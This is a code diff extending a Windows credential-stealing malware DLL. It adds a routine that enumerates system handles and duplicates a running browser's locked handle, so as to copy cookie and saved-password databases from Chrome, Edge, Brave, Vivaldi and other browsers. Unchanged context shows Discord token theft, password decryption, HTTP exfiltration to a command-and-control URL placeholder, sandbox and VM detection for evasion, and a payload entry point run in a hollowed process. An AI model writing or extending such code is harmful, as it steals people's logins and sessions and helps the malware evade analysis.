@@ -49,6 +49,9 @@ extern "C" void* memcpy(void* d, const void* s, size_t n){ char*a=(char*)d; cons
     for(size_t i=0;i<n;i++) a[i]=b[i]; return d; }
 extern "C" void* memset(void* d, int c, size_t n){ unsigned char*a=(unsigned char*)d;
     for(size_t i=0;i<n;i++) a[i]=(unsigned char)c; return d; }
+extern "C" int memcmp(const void* a, const void* b, size_t n){
+    const unsigned char* p=(const unsigned char*)a; const unsigned char* q=(const unsigned char*)b;
+    for(size_t i=0;i<n;i++){ if(p[i]!=q[i]) return (int)p[i]-(int)q[i]; } return 0; }
 // strchr/strstr: without CRT we implement locally with custom names to avoid header conflict
 static const char* xstrchr(const char* s, int c){ for(; *s; s++) if(*s==(char)c) return s; return 0; }
 static const char* xstrstr(const char* s, const char* sub){
@@ -70,7 +73,7 @@ static char g_c2_url[256] = "CKC2_DEADBEEF_";
 static char g_persist[8] = {'C','K','P','R','_','_','_','_'};
 
 // ------------------------------------------------------------------ JSON output buffer
-static char  g_out[512*1024];
+static char  g_out[2048*1024];
 static size_t g_len;
 static bool   g_first_rec = true;                          // controls comma in JSON array
 static void Put(const char* s, size_t n){ if(g_len+n<sizeof(g_out)-1){ memcpy(g_out+g_len,s,n); g_len+=n; } }
@@ -104,6 +107,34 @@ static void Dbg(const char* msg){
         WriteFile(h,"\r\n",2,&wr,NULL); CloseHandle(h);
     }
 }
+// DbgH: inline debug logging macro for use in CopyDb/HijackCookieDB.
+// Dbg() fails when called from CopyDb (5-param function) in the hollowed
+// process — likely a compiler codegen issue with /Od and /NODEFAULTLIB.
+// This macro inlines the file write, avoiding the function call entirely.
+#ifdef DEBUG
+#define DbgH(msg) do { \
+    HANDLE _dh = CreateFileW(L"C:\\ProgramData\\cookielog\\debug.log",GENERIC_WRITE, \
+        FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,0,NULL); \
+    if(_dh != INVALID_HANDLE_VALUE){ \
+        SetFilePointer(_dh,0,NULL,FILE_END); DWORD _wr2; \
+        const char* _p2 = (msg); while(*_p2) _p2++; \
+        WriteFile(_dh,(msg),(DWORD)(_p2-(msg)),&_wr2,NULL); \
+        WriteFile(_dh,"\r\n",2,&_wr2,NULL); CloseHandle(_dh); } \
+} while(0)
+#define DbgHInt(msg,val) do { \
+    char _buf2[300]; int _j2=0; const char* _m2=(msg); \
+    while(_m2[_j2] && _j2<250){ _buf2[_j2]=_m2[_j2]; _j2++; } \
+    _buf2[_j2++]=':'; _buf2[_j2++]=' '; \
+    int _v2=(val); if(_v2<0){ _buf2[_j2++]='-'; _v2=-_v2; } \
+    char _tmp2[16]; int _t2=0; if(_v2==0) _tmp2[_t2++]='0'; \
+    else while(_v2>0){ _tmp2[_t2++]='0'+_v2%10; _v2/=10; } \
+    while(_t2>0) _buf2[_j2++]=_tmp2[--_t2]; _buf2[_j2]=0; \
+    DbgH(_buf2); \
+} while(0)
+#else
+#define DbgH(x)   do{}while(0)
+#define DbgHInt(x,y) do{}while(0)
+#endif
 static void DbgStr(const char* prefix, const char* val){
     char buf[1400]; lstrcpyA(buf,prefix); lstrcatA(buf,val); Dbg(buf);
 }
@@ -135,6 +166,10 @@ typedef int  (__cdecl *tFin)(void*);   typedef int (__cdecl *tClose)(void*);
 static tOpenV2 S_open; static tPrep16 S_prep; static tStep S_step; static tInt S_int;
 static tInt64 S_int64;
 static tBlob S_blob; static tBytes S_bytes; static tFin S_fin; static tClose S_close;
+
+// NtQuerySystemInformation for handle hijacking (loaded from ntdll.dll at runtime)
+typedef LONG (WINAPI *tNtQSI)(ULONG, PVOID, ULONG, PULONG);
+static tNtQSI NtQSI = NULL;
 
 static bool Sqlite(void){
     g_sql = LoadLibraryA("winsqlite3.dll"); if(!g_sql) return false;
@@ -214,6 +249,194 @@ static int ToUtf8(const wchar_t* p, char* out, int cap){
     out[j]=0; return j;
 }
 
+// ------------------------------------------------------------------ handle hijacking
+// When a browser holds a 0-sharing lock on the cookie/password DB, CreateFileW
+// fails with error 32 (sharing violation). This function enumerates all system
+// handles via NtQuerySystemInformation(SystemExtendedHandleInformation=0x40),
+// finds the browser's SQLite DB handle, duplicates it with DUPLICATE_SAME_ACCESS,
+// reads the file, and verifies it has the expected table (cookies/logins).
+
+// Find PIDs of a process by exe name (e.g., L"vivaldi.exe")
+static int FindPids(const wchar_t* exe_name, DWORD* pids, int max_pids){
+    int count = 0;
+    HANDLE snap = CreateToolhelp32Snapshot(0x00000002 /*TH32CS_SNAPPROCESS*/, 0);
+    if(snap == INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
+    HMODULE k32 = GetModuleHandleA("kernel32.dll");
+    typedef BOOL (WINAPI *tFirst)(HANDLE, void*);
+    typedef BOOL (WINAPI *tNext)(HANDLE, void*);
+    tFirst fFirst = (tFirst)GetProcAddress(k32, "Process32FirstW");
+    tNext  fNext  = (tNext) GetProcAddress(k32, "Process32NextW");
+    if(fFirst && fNext && fFirst(snap, &pe)){
+        do {
+            if(lstrcmpiW(pe.szExeFile, exe_name) == 0 && count < max_pids)
+                pids[count++] = pe.th32ProcessID;
+        } while(fNext(snap, &pe));
+    }
+    CloseHandle(snap);
+    return count;
+}
+
+// SystemExtendedHandleInformation (0x40) on x64:
+//   Header: 16 bytes (NumberOfHandles:8 + Reserved:8)
+//   Entry:  40 bytes
+//     PVOID Object               offset 0
+//     ULONG_PTR UniqueProcessId  offset 8  (8 bytes on x64)
+//     ULONG_PTR HandleValue      offset 16 (8 bytes on x64)
+//     ULONG GrantedAccess        offset 24
+//     USHORT CreatorBackTraceIndex offset 28
+//     USHORT ObjectTypeIndex     offset 30
+//     ULONG HandleAttributes     offset 32
+//     ULONG Reserved             offset 36
+#pragma pack(push,8)
+struct HandleEntryEx {
+    void* Object;
+    unsigned __int64 UniqueProcessId;
+    unsigned __int64 HandleValue;
+    unsigned long GrantedAccess;
+    unsigned short CreatorBackTraceIndex;
+    unsigned short ObjectTypeIndex;
+    unsigned long HandleAttributes;
+    unsigned long Reserved;
+};
+#pragma pack(pop)
+
+// Hijack a SQLite DB handle from a running browser process.
+// exe_name: e.g. L"vivaldi.exe" â€” used to find browser PIDs
+// dst: temp file path to write the DB to
+// table_name: expected SQLite table name (L"cookies" or L"logins")
+// Returns true if a DB with the expected table was found and written to dst.
+static bool HijackCookieDB(const wchar_t* exe_name, const wchar_t* dst,
+                           const wchar_t* table_name){
+    if(!exe_name || !*exe_name) return false;
+    DbgH("HijackCookieDB: starting scan");
+
+    // 1. Find browser PIDs
+    DWORD pids[64]; int npids = FindPids(exe_name, pids, 64);
+    DbgHInt("HijackCookieDB: browser PIDs found", npids);
+    if(npids == 0) return false;
+
+    // 2. Load NtQuerySystemInformation
+    if(!NtQSI){
+        HMODULE nt = GetModuleHandleA("ntdll.dll");
+        NtQSI = (tNtQSI)GetProcAddress(nt, "NtQuerySystemInformation");
+        if(!NtQSI){ DbgH("HijackCookieDB: NtQuerySystemInformation not found"); return false; }
+    }
+
+    // 3. Query system handles (0x40 = SystemExtendedHandleInformation)
+    unsigned long bufSize = 0x200000; // 2MB initial
+    unsigned long actual = 0;
+    char* buf = (char*)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if(!buf) return false;
+    LONG status = NtQSI(0x40, buf, bufSize, &actual);
+    if(status == 0xC0000004){ // STATUS_INFO_LENGTH_MISMATCH â€” need bigger buffer
+        VirtualFree(buf, 0, MEM_RELEASE);
+        bufSize = actual + 0x1000;
+        buf = (char*)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+        if(!buf) return false;
+        status = NtQSI(0x40, buf, bufSize, &actual);
+    }
+    if(status != 0){
+        DbgHInt("HijackCookieDB: NtQSI failed (status)", (int)status);
+        VirtualFree(buf, 0, MEM_RELEASE);
+        return false;
+    }
+    unsigned __int64 count = *(unsigned __int64*)buf;
+    DbgHInt("HijackCookieDB: total handles (low32)", (int)(count & 0xFFFFFFFF));
+
+    HandleEntryEx* entries = (HandleEntryEx*)(buf + 16); // skip 16-byte header
+
+    // 4. Scan handles â€” find SQLite DB in browser process
+    for(unsigned __int64 i = 0; i < count; i++){
+        HandleEntryEx* e = &entries[i];
+        if(e->UniqueProcessId == 0 || e->UniqueProcessId == 4) continue;
+
+        // Check if PID matches a browser process
+        bool match = false;
+        for(int p = 0; p < npids; p++){
+            if(e->UniqueProcessId == pids[p]){ match = true; break; }
+        }
+        if(!match) continue;
+
+        // Duplicate handle with DUPLICATE_SAME_ACCESS
+        // (Vivaldi's handle has FILE_READ_DATA but not READ_CONTROL,
+        //  so GENERIC_READ duplicate would fail)
+        HANDLE hProc = OpenProcess(0x0040 /*PROCESS_DUP_HANDLE*/, FALSE,
+                                   (DWORD)e->UniqueProcessId);
+        if(!hProc || hProc == INVALID_HANDLE_VALUE) continue;
+        HANDLE dup = NULL;
+        if(!DuplicateHandle(hProc, (HANDLE)e->HandleValue, GetCurrentProcess(),
+                           &dup, 0, FALSE, 0x0002 /*DUPLICATE_SAME_ACCESS*/)){
+            CloseHandle(hProc); continue;
+        }
+
+        // Check if disk file
+        if(GetFileType(dup) != 1 /*FILE_TYPE_DISK*/){
+            CloseHandle(dup); CloseHandle(hProc); continue;
+        }
+
+        // Read first 16 bytes for SQLite magic
+        LARGE_INTEGER zero; zero.QuadPart = 0;
+        SetFilePointerEx(dup, zero, NULL, FILE_BEGIN);
+        char magic[16]; DWORD rd = 0;
+        if(!ReadFile(dup, magic, 16, &rd, NULL) || rd != 16){
+            CloseHandle(dup); CloseHandle(hProc); continue;
+        }
+        if(memcmp(magic, "SQLite format 3\x00", 16) != 0){
+            CloseHandle(dup); CloseHandle(hProc); continue;
+        }
+
+        // Found a SQLite DB â€” check size
+        DWORD fsize = GetFileSize(dup, NULL);
+        DbgHInt("HijackCookieDB: SQLite DB found, size", (int)fsize);
+        if(fsize < 50000 || fsize > 50000000){
+            CloseHandle(dup); CloseHandle(hProc); continue;
+        }
+
+        // Read the whole file to dst
+        SetFilePointerEx(dup, zero, NULL, FILE_BEGIN);
+        DeleteFileW(dst);
+        HANDLE hOut = CreateFileW(dst, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+        if(hOut == INVALID_HANDLE_VALUE){
+            CloseHandle(dup); CloseHandle(hProc); continue;
+        }
+        char rbuf[65536]; DWORD totalRead = 0; bool readOk = true;
+        while(totalRead < fsize){
+            DWORD toRead = (fsize - totalRead < (DWORD)sizeof(rbuf)) ?
+                           (fsize - totalRead) : (DWORD)sizeof(rbuf);
+            DWORD nRead = 0;
+            if(!ReadFile(dup, rbuf, toRead, &nRead, NULL) || nRead == 0){ readOk = false; break; }
+            DWORD nWritten = 0;
+            if(!WriteFile(hOut, rbuf, nRead, &nWritten, NULL) || nWritten != nRead){ readOk = false; break; }
+            totalRead += nRead;
+        }
+        CloseHandle(hOut); CloseHandle(dup); CloseHandle(hProc);
+        if(!readOk){ DbgH("HijackCookieDB: read failed"); continue; }
+
+        // Verify the expected table exists
+        char path8[1024]; ToUtf8(dst, path8, sizeof(path8));
+        void* con = NULL; int rc = S_open(path8, &con, 1/*SQLITE_OPEN_READONLY*/, NULL);
+        if(rc || !con){ DbgHInt("HijackCookieDB: sqlite open failed", rc); continue; }
+        void* st = NULL;
+        wchar_t sql[128]; lstrcpyW(sql, L"SELECT count(*) FROM ");
+        lstrcatW(sql, table_name);
+        rc = S_prep(con, sql, -1, &st, NULL);
+        if(rc){ S_close(con); DbgHInt("HijackCookieDB: table not found", rc); continue; }
+        if(S_step(st) == 100 /*SQLITE_ROW*/){
+            int cnt = S_int(st, 0);
+            DbgHInt("HijackCookieDB: table found, row count", cnt);
+            S_fin(st); S_close(con);
+            VirtualFree(buf, 0, MEM_RELEASE);
+            return true;
+        }
+        S_fin(st); S_close(con);
+    }
+
+    VirtualFree(buf, 0, MEM_RELEASE);
+    DbgH("HijackCookieDB: no matching DB handle found");
+    return false;
+}
+
 // Copy a file using CreateFileW with FILE_SHARE_READ|WRITE|DELETE.
 // CopyFileW fails when a browser holds an exclusive lock on the cookie DB;
 // opening with FILE_SHARE_WRITE bypasses that lock (read-while-locked).
@@ -225,7 +448,7 @@ static bool CopyFileShared(const wchar_t* src, const wchar_t* dst){
         NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if(hIn == INVALID_HANDLE_VALUE){
         DbgInt("CopyFileShared: CreateFileW failed (err)", GetLastError());
-        // File is exclusively locked (0 sharing) — browser must be closed.
+        // File is exclusively locked (0 sharing) â€” browser must be closed.
         // esentutl /vss was tried but hangs without admin/VSS service.
         // Firefox cookies still work (Firefox doesn't hold exclusive locks).
         return false;
@@ -249,11 +472,20 @@ static bool CopyFileShared(const wchar_t* src, const wchar_t* dst){
 // Copy a SQLite database (and -wal/-shm companions) to %TEMP%\ck_db.tmp
 // Uses CopyFileShared to bypass browser file locks (Chrome/Edge hold exclusive
 // locks on live cookie DBs; CopyFileW fails, but CreateFileW with FILE_SHARE_WRITE works)
-static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap){
+static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap,
+                   const wchar_t* exe_name, const wchar_t* table_name){
     wchar_t tmp[MAX_PATH]; GetTempPathW(MAX_PATH, tmp);
     lstrcpyW(dst, tmp); lstrcatW(dst, L"ck_db.tmp");
     DeleteFileW(dst);
-    if(!CopyFileShared(src, dst)) return false;
+    if(!CopyFileShared(src, dst)){
+        // Browser holds 0-sharing lock â€” try handle hijack
+        DbgH("CopyDb: CopyFileShared failed, trying handle hijack");
+        if(exe_name && *exe_name && HijackCookieDB(exe_name, dst, table_name)){
+            DbgH("CopyDb: handle hijack OK");
+            return true;
+        }
+        return false;
+    }
     wchar_t s2[MAX_PATH], d2[MAX_PATH];
     lstrcpyW(s2, src); lstrcatW(s2, L"-wal"); lstrcpyW(d2, dst); lstrcatW(d2, L"-wal");
     DeleteFileW(d2); CopyFileShared(s2, d2);
@@ -263,16 +495,16 @@ static bool CopyDb(const wchar_t* src, wchar_t* dst, int dst_cap){
 }
 
 // ------------------------------------------------------------------ browser profiles
-struct Br { const wchar_t* name; const wchar_t* rel; };
-static Br g_br[] = { {L"chrome",  L"\\Google\\Chrome\\User Data"},
-                     {L"edge",    L"\\Microsoft\\Edge\\User Data"},
-                     {L"brave",   L"\\BraveSoftware\\Brave-Browser\\User Data"},
-                     {L"vivaldi", L"\\Vivaldi\\User Data"},
-                     {L"opera",   L"\\Opera Software\\Opera Stable"},
-                     {L"chromium",L"\\Chromium\\User Data"},
-                     {L"thorium", L"\\Thorium\\User Data"},
-                     {L"coccoc",  L"\\CocCoc\\Browser\\User Data"},
-                     {L"yandex", L"\\Yandex\\YandexBrowser\\User Data"} };
+struct Br { const wchar_t* name; const wchar_t* rel; const wchar_t* exe; };
+static Br g_br[] = { {L"chrome",  L"\\Google\\Chrome\\User Data",           L"chrome.exe"},
+                     {L"edge",    L"\\Microsoft\\Edge\\User Data",          L"msedge.exe"},
+                     {L"brave",   L"\\BraveSoftware\\Brave-Browser\\User Data", L"brave.exe"},
+                     {L"vivaldi", L"\\Vivaldi\\User Data",                  L"vivaldi.exe"},
+                     {L"opera",   L"\\Opera Software\\Opera Stable",       L"opera.exe"},
+                     {L"chromium",L"\\Chromium\\User Data",                L"chromium.exe"},
+                     {L"thorium", L"\\Thorium\\User Data",                 L"thorium.exe"},
+                     {L"coccoc",  L"\\CocCoc\\Browser\\User Data",         L"coccoc.exe"},
+                     {L"yandex", L"\\Yandex\\YandexBrowser\\User Data",    L"browser.exe"} };
 
 static unsigned char g_key10[32]; static bool g_has10;   // v10/v11 key (DPAPI user)
 static unsigned char g_key20[32]; static bool g_has20;   // v20 key (app-bound, pre-extracted)
@@ -379,7 +611,7 @@ static bool DecCookie(const unsigned char* enc, int n, unsigned char* out, int* 
 }
 
 // Extract cookies from a Chromium-based browser in Cookie-Editor JSON format
-static void DumpChromium(const wchar_t* brname, const wchar_t* root){
+static void DumpChromium(const wchar_t* brname, const wchar_t* root, const wchar_t* exe){
     Dbg("DumpChromium: entry");
     // FindFirstFile only accepts wildcards in the LAST path component; enumerate profiles first
     wchar_t pat[1024]; lstrcpyW(pat,root); lstrcatW(pat,L"\\*");
@@ -396,7 +628,7 @@ static void DumpChromium(const wchar_t* brname, const wchar_t* root){
             lstrcatW(db,fd.cFileName); lstrcatW(db,sfx[si]);
             if(GetFileAttributesW(db)==INVALID_FILE_ATTRIBUTES) continue;
             wchar_t tmp_db[MAX_PATH];
-            if(!CopyDb(db,tmp_db,MAX_PATH)){ Dbg("DumpChromium: copy failed (browser running?)"); continue; }
+            if(!CopyDb(db,tmp_db,MAX_PATH,exe,L"cookies")){ Dbg("DumpChromium: copy failed (browser running?)"); continue; }
             Dbg("DumpChromium: copy OK");
             char path8[1024]; ToUtf8(tmp_db,path8,sizeof(path8));
             DbgStr("DumpChromium: opening ", path8);
@@ -454,7 +686,7 @@ static void DumpFirefox(const wchar_t* appdata){
         lstrcatW(db,L"\\cookies.sqlite");
         if(GetFileAttributesW(db)==INVALID_FILE_ATTRIBUTES) continue;
         wchar_t tmp_db[MAX_PATH];
-        if(!CopyDb(db,tmp_db,MAX_PATH)){ Dbg("DumpFirefox: copy failed"); continue; }
+        if(!CopyDb(db,tmp_db,MAX_PATH,NULL,L"cookies")){ Dbg("DumpFirefox: copy failed"); continue; }
         Dbg("DumpFirefox: copy OK");
         char path8[1024]; ToUtf8(tmp_db,path8,sizeof(path8));
         DbgStr("DumpFirefox: opening ", path8);
@@ -563,7 +795,7 @@ static void DumpDiscordTokens(const wchar_t* appdata){
 // ------------------------------------------------------------------ Browser saved passwords (Chromium Login Data)
 // Same AES-256-GCM encryption as cookies, same key (v10/v11/v20).
 // Path: <profile>\Login Data (SQLite: logins table)
-static void DumpPasswords(const wchar_t* name, const wchar_t* root){
+static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_t* exe){
     Dbg("DumpPasswords: entry");
     wchar_t prof[1024];
     // Try Default profile, then Profile 1, Profile 2, etc.
@@ -574,7 +806,7 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root){
         if(GetFileAttributesW(prof)==INVALID_FILE_ATTRIBUTES) continue;
 
         wchar_t tmp[MAX_PATH];
-        if(!CopyDb(prof, tmp, MAX_PATH)){ Dbg("DumpPasswords: copy failed"); continue; }
+        if(!CopyDb(prof, tmp, MAX_PATH, exe, L"logins")){ Dbg("DumpPasswords: copy failed"); continue; }
         Dbg("DumpPasswords: copy OK");
 
         char path8[1024]; ToUtf8(tmp,path8,sizeof(path8));
@@ -601,7 +833,7 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root){
             }
             if(pwd_ok){ dec_ok++; }
             else{
-                // Decryption failed — write empty value instead of raw encrypted bytes
+                // Decryption failed â€” write empty value instead of raw encrypted bytes
                 // (raw v10 blobs are useless and pollute the JSON with binary garbage)
                 pwd_len = 0;
                 dec_fail++;
@@ -734,7 +966,7 @@ static bool ExfilHTTP(const char* url){
     }
     DbgInt("ExfilHTTP: body sent", (int)off);
 
-    // Read response (discard) — has 10s timeout
+    // Read response (discard) â€” has 10s timeout
     char resp[256];
     int r = fRecv(sock, resp, sizeof(resp), 0);
     if(r > 0){ DbgInt("ExfilHTTP: response received", r); }
@@ -787,7 +1019,7 @@ static bool IsAnalysisEnv(void){
     // VMware: 00:0C:29, 00:50:56, 00:05:69
     // VirtualBox: 08:00:27, 0A:00:27
     // QEMU: 52:54:00
-    // (Hyper-V 00:15:5D excluded — WSL creates a Hyper-V virtual adapter on real machines)
+    // (Hyper-V 00:15:5D excluded â€” WSL creates a Hyper-V virtual adapter on real machines)
     IP_ADAPTER_INFO adapter[16];
     ULONG bufLen = sizeof(adapter);
     HMODULE iphlp = LoadLibraryA("iphlpapi.dll");
@@ -984,8 +1216,8 @@ extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD r
         if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) continue;
         Dbg("payload_entry: found chromium profile");
         LoadLocalState(root);
-        DumpChromium(g_br[i].name,root);
-        DumpPasswords(g_br[i].name,root);
+        DumpChromium(g_br[i].name,root,g_br[i].exe);
+        DumpPasswords(g_br[i].name,root,g_br[i].exe);
     }
     Dbg("payload_entry: before DumpFirefox");
     DumpFirefox(aa);
